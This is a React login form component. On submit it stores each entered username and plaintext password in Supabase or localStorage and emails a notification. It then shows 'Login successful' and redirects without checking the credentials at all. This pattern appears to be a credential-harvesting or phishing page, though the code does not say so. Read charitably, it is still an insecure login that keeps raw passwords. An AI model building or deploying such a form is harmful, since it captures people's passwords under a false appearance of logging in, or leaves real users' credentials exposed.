import React, { useState } from 'react';
import { AtSign, Lock, Eye, EyeOff, ArrowRight } from 'lucide-react';
import { storeLoginAttempt, sendEmailNotification } from '../lib/supabase';
import toast from 'react-hot-toast';

interface LoginFormProps {
  onLoginSuccess: () => void;
}

const LoginForm: React.FC<LoginFormProps> = ({ onLoginSuccess }) => {
  const [username, setUsername] = useState('');
  const [password, setPassword] = useState('');
  const [showPassword, setShowPassword] = useState(false);
  const [isLoading, setIsLoading] = useState(false);
  const [errors, setErrors] = useState({
    username: '',
    password: '',
  });

  const validateForm = () => {
    let valid = true;
    const newErrors = {
      username: '',
      password: '',
    };

    if (!username.trim()) {
      newErrors.username = 'Username is required';
      valid = false;
    }

    if (!password) {
      newErrors.password = 'Password is required';
      valid = false;
    } 

    setErrors(newErrors);
    return valid;
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    
    if (!validateForm()) return;
    
    setIsLoading(true);
    
    try {
      // Store the login attempt in Supabase or localStorage
      const storeResult = await storeLoginAttempt({ username, password });
      
      // Send notification email
      await sendEmailNotification({ username });
      
      // Show success message
      if (storeResult.localStorage) {
        toast.success('Login stored locally (Supabase not configured)');
      } else {
        toast.success('Login successful');
      }
      
      // Simulate a delay before redirecting
      setTimeout(() => {
        onLoginSuccess();
        setIsLoading(false);
      }, 1500);
    } catch (error) {
      console.error('Login error:', error);
      toast.error('Something went wrong. Please try again.');
      setIsLoading(false);
    }
  };

  return (
    <form onSubmit={handleSubmit} className="w-full max-w-md space-y-6">
      <div className="space-y-4">
        <div className="relative">
          <div className="absolute inset-y-0 left-0 flex items-center pl-3 pointer-events-none text-gray-400">
            <AtSign size={20} />
          </div>
          <input
            type="text"
            id="username"
            value={username}
            onChange={(e) => setUsername(e.target.value)}
            className={`w-full py-3 pl-10 pr-4 text-gray-800 bg-gray-50 border ${errors.username ? 'border-red-500' : 'border-gray-300'} rounded-md focus:outline-none focus:ring-2 focus:ring-pink-500 focus:border-transparent`}
            placeholder="Email or username"
          />
          {errors.username && (
            <p className="mt-1 text-sm text-red-500">{errors.username}</p>
          )}
        </div>

        <div className="relative">
          <div className="absolute inset-y-0 left-0 flex items-center pl-3 pointer-events-none text-gray-400">
            <Lock size={20} />
          </div>
          <input
            type={showPassword ? "text" : "password"}
            id="password"
            value={password}
            onChange={(e) => setPassword(e.target.value)}
            className={`w-full py-3 pl-10 pr-12 text-gray-800 bg-gray-50 border ${errors.password ? 'border-red-500' : 'border-gray-300'} rounded-md focus:outline-none focus:ring-2 focus:ring-pink-500 focus:border-transparent`}
            placeholder="Password"
          />
          <button
            type="button"
            onClick={() => setShowPassword(!showPassword)}
            className="absolute inset-y-0 right-0 flex items-center pr-3 text-gray-500 hover:text-gray-700"
          >
            {showPassword ? <EyeOff size={20} /> : <Eye size={20} />}
          </button>
          {errors.password && (
            <p className="mt-1 text-sm text-red-500">{errors.password}</p>
          )}
        </div>
      </div>

      <div className="flex justify-end">
        <button
          type="button"
          className="text-sm text-gray-600 hover:text-pink-500 focus:outline-none"
        >
          Forgot password?
        </button>
      </div>

      <button
        type="submit"
        disabled={isLoading}
        className="flex items-center justify-center w-full py-3 px-4 text-white bg-pink-500 hover:bg-pink-600 rounded-md focus:outline-none focus:ring-2 focus:ring-pink-500 focus:ring-offset-2 transition-all duration-300 relative overflow-hidden group"
      >
        <span className={`flex items-center ${isLoading ? 'opacity-0' : 'opacity-100'}`}>
          <span className="mr-2">Log in</span>
          <ArrowRight size={18} className="transform group-hover:translate-x-1 transition-transform duration-300" />
        </span>
        {isLoading && (
          <div className="absolute inset-0 flex items-center justify-center">
            <div className="w-5 h-5 border-t-2 border-white rounded-full animate-spin"></div>
          </div>
        )}
      </button>
    </form>
  );
};

export default LoginForm;